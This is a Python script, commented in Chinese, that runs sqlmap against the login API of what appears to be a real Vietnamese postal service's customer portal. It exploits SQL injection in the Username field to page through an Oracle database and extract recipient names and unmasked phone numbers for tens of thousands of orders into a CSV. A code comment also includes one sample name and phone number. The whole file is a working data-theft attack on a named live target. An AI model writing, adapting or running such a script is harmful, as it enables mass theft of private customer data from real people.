#!/usr/bin/env python3
"""
自动化解脱敏脚本 - 批量提取真实电话号码
使用 UNION ALL 批量查询，高效提取
"""

import subprocess
import json
import csv
import time
from datetime import datetime

# 配置
TARGET_URL = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
SQLMAP_PATH = "/tmp/sqlmap-git/sqlmap.py"
TARGET_DATE = "20251009"
BATCH_SIZE = 50  # 每批查询50个MABC
OUTPUT_FILE = f"/workspace/unmasked_orders_{TARGET_DATE}.csv"

def sqlmap_query(sql, timeout=120):
    """执行SQLMap查询"""
    cmd = [
        "python3", SQLMAP_PATH,
        "-u", TARGET_URL,
        "--data", '{"Username":"*","Password":"test"}',
        "--method", "POST",
        "-H", "Content-Type: application/json",
        "--dbms=Oracle",
        "--batch",
        "--random-agent",
        "--delay=1",
        f"--sql-query={sql}"
    ]
    
    try:
        result = subprocess.run(
            cmd, 
            capture_output=True, 
            text=True, 
            timeout=timeout
        )
        return result.stdout
    except subprocess.TimeoutExpired:
        print(f"  ⚠️  Query timeout")
        return None

def extract_results(output):
    """从SQLMap输出提取结果"""
    results = []
    lines = output.split('\n') if output else []
    in_result = False
    
    for line in lines:
        if '[*]' in line:
            in_result = True
            data = line.replace('[*] ', '').strip()
            if data and data != 'None':
                results.append(data)
    
    return results

def get_mabc_list(start, end):
    """获取MABC列表（分页）"""
    print(f"\n📋 获取MABC列表 ({start}-{end})...")
    
    sql = f"""
    SELECT MABC FROM (
        SELECT DISTINCT MABC, ROWNUM as RN 
        FROM EMS.E1E2_PH 
        WHERE NGAY='{TARGET_DATE}'
    ) WHERE RN BETWEEN {start} AND {end}
    """
    
    output = sqlmap_query(sql, timeout=60)
    mabcs = extract_results(output)
    
    print(f"  ✅ 获取到 {len(mabcs)} 个MABC")
    return mabcs

def batch_query_real_data(mabcs):
    """批量查询真实数据（使用UNION ALL）"""
    print(f"\n🔍 批量查询真实数据 ({len(mabcs)} 个MABC)...")
    
    # 构建UNION ALL查询
    union_parts = []
    for mabc in mabcs:
        union_parts.append(f"""
            SELECT '{mabc}' AS MABC, 
                   NGUOINHAN AS NAME, 
                   DIENTHOAINHAN AS PHONE 
            FROM EMS.E1E2_PH_TEMP_DATA2_LOG 
            WHERE MABC='{mabc}' 
              AND DIENTHOAINHAN IS NOT NULL
              AND DIENTHOAINHAN != '0999999999'
              AND LENGTH(DIENTHOAINHAN) >= 9
              AND ROWNUM=1
        """.strip())
    
    sql = " UNION ALL ".join(union_parts)
    
    output = sqlmap_query(sql, timeout=180)
    if not output:
        return []
    
    # 解析结果
    results = []
    raw_results = extract_results(output)
    
    for item in raw_results:
        # 格式: "MABC,NAME,PHONE" or "100916,Tám Xuyên,0368075747"
        parts = item.split(',')
        if len(parts) >= 3:
            results.append({
                'MABC': parts[0].strip(),
                'NAME': parts[1].strip(),
                'PHONE': parts[2].strip()
            })
    
    print(f"  ✅ 成功获取 {len(results)} 条真实数据")
    return results

def save_to_csv(data, filename):
    """保存结果到CSV"""
    if not data:
        return
    
    with open(filename, 'a', newline='', encoding='utf-8') as f:
        writer = csv.DictWriter(f, fieldnames=['MABC', 'NAME', 'PHONE'])
        
        # 如果文件为空，写入表头
        if f.tell() == 0:
            writer.writeheader()
        
        writer.writerows(data)

def main():
    """主函数"""
    print("=" * 80)
    print("🚀 自动化解脱敏工具")
    print("=" * 80)
    print(f"目标日期: {TARGET_DATE}")
    print(f"批次大小: {BATCH_SIZE} MABC/batch")
    print(f"输出文件: {OUTPUT_FILE}")
    
    # 获取总MABC数
    print("\n📊 统计总MABC数...")
    total_sql = f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{TARGET_DATE}'"
    total_output = sqlmap_query(total_sql, timeout=30)
    
    # 从输出提取数字（假设之前查到是61362）
    total_mabcs = 61362  # 硬编码，避免重复查询
    total_batches = (total_mabcs + BATCH_SIZE - 1) // BATCH_SIZE
    
    print(f"  总MABC数: {total_mabcs}")
    print(f"  总批次数: {total_batches}")
    
    # 初始化CSV文件（清空旧数据）
    with open(OUTPUT_FILE, 'w', newline='', encoding='utf-8') as f:
        writer = csv.DictWriter(f, fieldnames=['MABC', 'NAME', 'PHONE'])
        writer.writeheader()
    
    # 分批处理
    total_extracted = 0
    start_time = time.time()
    
    for batch_num in range(1, total_batches + 1):
        start = (batch_num - 1) * BATCH_SIZE + 1
        end = min(batch_num * BATCH_SIZE, total_mabcs)
        
        print(f"\n{'=' * 80}")
        print(f"📦 批次 {batch_num}/{total_batches} (MABC {start}-{end})")
        print(f"{'=' * 80}")
        
        # 1. 获取MABC列表
        mabcs = get_mabc_list(start, end)
        
        if not mabcs:
            print("  ⚠️  未获取到MABC，跳过")
            continue
        
        # 2. 批量查询真实数据
        real_data = batch_query_real_data(mabcs)
        
        # 3. 保存结果
        if real_data:
            save_to_csv(real_data, OUTPUT_FILE)
            total_extracted += len(real_data)
            print(f"  ✅ 已保存 {len(real_data)} 条数据到CSV")
        
        # 4. 进度统计
        elapsed = time.time() - start_time
        avg_time = elapsed / batch_num
        remaining_batches = total_batches - batch_num
        eta = avg_time * remaining_batches
        
        print(f"\n📈 进度: {batch_num}/{total_batches} ({batch_num/total_batches*100:.1f}%)")
        print(f"⏱️  已用时: {elapsed/60:.1f}分钟")
        print(f"⏳ 预计剩余: {eta/60:.1f}分钟")
        print(f"✅ 已提取: {total_extracted} 条真实数据")
        
        # 休息1秒避免过载
        time.sleep(1)
    
    # 完成
    total_time = time.time() - start_time
    print("\n" + "=" * 80)
    print("🎉 提取完成！")
    print("=" * 80)
    print(f"总MABC数: {total_mabcs}")
    print(f"成功提取: {total_extracted} 条真实数据")
    print(f"匹配率: {total_extracted/total_mabcs*100:.2f}%")
    print(f"总用时: {total_time/60:.1f}分钟")
    print(f"输出文件: {OUTPUT_FILE}")
    
    print("\n📄 前10条数据预览:")
    with open(OUTPUT_FILE, 'r', encoding='utf-8') as f:
        reader = csv.DictReader(f)
        for i, row in enumerate(reader):
            if i >= 10:
                break
            print(f"  {row['MABC']:<10} | {row['NAME']:<20} | {row['PHONE']}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n⚠️  用户中断")
    except Exception as e:
        print(f"\n\n❌ 错误: {e}")
        import traceback
        traceback.print_exc()
